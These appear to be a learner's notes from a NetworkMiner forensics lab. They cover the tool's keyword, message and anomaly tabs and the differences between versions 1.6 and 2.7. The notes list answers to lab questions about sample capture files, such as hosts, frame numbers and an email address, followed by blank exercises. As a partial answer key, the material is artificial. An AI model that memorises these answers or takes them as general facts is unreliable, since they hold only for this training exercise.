- Parameter name
- Parameter value
- Frame number
- Source and destination host
- Source and destination port
- Timestamp
- Details

The right-click menu is helpful in this part as well. You can copy the parameters and values easily.

**Keywords**

The file menu shows extracted keywords from investigated pcaps. This section provides information on;

- Frame number
- Timestamp
- Keyword
- Context
- Source and destination host
- source and destination port

How to filter keywords;

- Add keywords
- Reload case files!

**Note:** You can filter multiple keywords in this section; however, you must reload the case files after updating the search keywords. Keyword search investigates all possible data in the processed pcaps.

**Messages**

The messages menu shows extracted emails, chats and messages from investigated pcaps. This section provides information on;

- Frame number
- Source and destination host 
- Protocol
- Sender (From)
- Receiver (To)
- Timestamp
- Size

Once you filter the traffic and get a hit, you will discover additional details like attachments and attributes on the selected message. Note that the search bar is available here as well. The right-click menu is available here. You can use the built-in viewer to investigate overall information and the "open file" option to explore attachments.

**Anomalies**

The anomalies menu shows detected anomalies in the processed pcap. Note that NetworkMiner isn't designated as an IDS. However, developers added some detections for EternalBlue exploit and spoofing attempts.

**Questions**

Use mx-7 pcap

What is the name of the Linux distro mentioned in the file associated with frame 63075? 
- On the Files tab enter the frame number in the Filter Keyword and click apply. Look at the Source Host
- centos

What is the header of the page associated with frame 75942?
- On the Files tab enter the frame number in the Filter Keyword and click apply. Right click and open File Details. Look for `<h1>`
- Password-Ned AB

What is the source address of the image "ads.bmp.2E5F0FD9.bmp"?
- On the Files tab enter the file name in the Filter Keyword and click apply. Look at the Source Host
- 80.239.178.187

What is the frame number of the possible TLS anomaly?
- On the Anomalies tab look at the frame number
- 36255

Use mx-9 file

Look at the messages. Which platform sent a password reset email?
- How? No password reset email but only 1 email with password in it.
- facebook

What is the email address of Branson Matheson?
- On the Messages tab look at the From column
- branson@sandsite.org

### _**Version Differences**_

As always, it wouldn't be surprising to see a feature improvement as the version goes up. Unsurprisingly version upgrades provide stability, security fixes and features. Here the feature part is quite tricky. Feature upgrades can represent implementing new features and updating the existing feature (optimisation, alteration or operation mode modification). You can always check the changelog [here](https://www.netresec.com/?page=NetworkMiner).  

Since there are some significant differences between the versions, the given VM has both of the major versions (v1.6 and v2.7).

Of course, as the program version increases, it is expected to increase feature increase and scope. Here are the significant differences between versions 1.6 and 2.7. Here are the differences;

**Mac Address Processing**

NetworkMiner versions after version 2 can process MAC address specific correlation as shown in the picture below. This option will help you identify if there is a MAC Address conflict. This feature is not available before version 2.

**Sent/Received Packet Processing**

NetwrokMiner versions up to version 1.6. can handle packets in much detail. These options will help you investigate the sent/received packets in a more detailed format. This feature is not available after version 1.6.

**Frame Processing**

NetworkMiner versions up to version 1.6. can handle frames. This option provides the number of frames and essential details about the frames. This feature is not available after version 1.6.

**Parameter Processing**

NetworkMiner versions after version 2 can handle parameters in a much more extensive form. Therefore version 1.6.xx catches fewer parameters than version 2.

**Cleartext Processing**

NetworkMiner versions up to version 1.6. can handle cleartext data. This option provides all extracted cleartext data in a single tab; it is beneficial to investigate cleartext data about the traffic data. However, it is impossible to match the cleartext data and packets. This feature is not available after version 1.6.

Which version can detect duplicate MAC addresses?
- 2.7

Which version can handle frames?
- 1.6

Which version can provide more details on packet details?
- 1.6

### _**Exercises**_

Use case1.pcap

What is the OS name of the host 131.151.37.122?
- 

Investigate the hosts 131.151.37.122 and 131.151.32.91.
How many data bytes were received from host 131.151.32.91 to host 131.151.37.122 through port 1065?
- 

Investigate the hosts 131.151.37.122 and 131.151.32.21.
How many data bytes were received from host 131.151.37.122 to host 131.151.32.21 through port 143?
- 

What is the sequence number of frame 9?
- 

What is the number of the detected "content types"?
- 

Use case2.pcap
Investigate the files.

What is the USB product's brand name?
- 

What is the name of the phone model?
- 

What is the source IP of the fish image?
- 

What is the password of the "homer.pwned.se@gmx.com"?
- 

What is the DNS Query of frame 62001?
- 

